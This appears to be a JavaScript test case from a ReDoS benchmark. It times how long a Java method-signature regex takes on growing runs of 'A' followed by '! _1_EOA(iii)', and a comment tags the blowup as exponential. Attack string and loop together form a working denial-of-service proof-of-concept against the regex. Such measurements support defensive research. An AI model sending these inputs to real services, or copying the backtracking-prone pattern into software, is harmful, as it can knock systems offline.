/* 2766
 * (?:@[A-Z]\w*\s+)*(?:(?:public|private|protected)\s+)?(?:(?:(?:abstract|final|native|transient|static|synchronized)\s+)*(?:<(?:\?|[A-Z]\w*)(?:\s+(?:extends|super)\s+[A-Z]\w*)?(?:(?:,\s*(?:\?|[A-Z]\w*))(?:\s+(?:extends|super)\s+[A-Z]\w*)?)*>\s+)?(?:(?:(?:[A-Z]\w*(?:<[A-Z]\w*>)?|int|float|double|char|byte|long|short|boolean)(?:(?:\[\]))*)|void)+)\s+(([a-zA-Z]\w*)\s*\(\s*(((?:[A-Z]\w*(?:<(?:\?|[A-Z]\w*)(?:\s+(?:extends|super)\s+[A-Z]\w*)?(?:(?:,\s*(?:\?|[A-Z]\w*))(?:\s+(?:extends|super)\s+[A-Z]\w*)?)*>)?|int|float|double|char|boolean|byte|long|short)(?:(?:\[\])|\.\.\.)?\s+[a-z]\w*)(?:,\s*((?:[A-Z]\w*(?:<[A-Z]\w*>)?|int|float|double|char|byte|long|short|boolean)(?:(?:\[\])|\.\.\.)?\s+[a-z]\w*))*)?\s*\))
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"A"*32+"! _1_EOA(iii)"
 */
var REGEX = /(?:@[A-Z]\w*\s+)*(?:(?:public|private|protected)\s+)?(?:(?:(?:abstract|final|native|transient|static|synchronized)\s+)*(?:<(?:\?|[A-Z]\w*)(?:\s+(?:extends|super)\s+[A-Z]\w*)?(?:(?:,\s*(?:\?|[A-Z]\w*))(?:\s+(?:extends|super)\s+[A-Z]\w*)?)*>\s+)?(?:(?:(?:[A-Z]\w*(?:<[A-Z]\w*>)?|int|float|double|char|byte|long|short|boolean)(?:(?:\[\]))*)|void)+)\s+(([a-zA-Z]\w*)\s*\(\s*(((?:[A-Z]\w*(?:<(?:\?|[A-Z]\w*)(?:\s+(?:extends|super)\s+[A-Z]\w*)?(?:(?:,\s*(?:\?|[A-Z]\w*))(?:\s+(?:extends|super)\s+[A-Z]\w*)?)*>)?|int|float|double|char|boolean|byte|long|short)(?:(?:\[\])|\.\.\.)?\s+[a-z]\w*)(?:,\s*((?:[A-Z]\w*(?:<[A-Z]\w*>)?|int|float|double|char|byte|long|short|boolean)(?:(?:\[\])|\.\.\.)?\s+[a-z]\w*))*)?\s*\))/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + 'A'.repeat(i*1) + '! _1_EOA(iii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}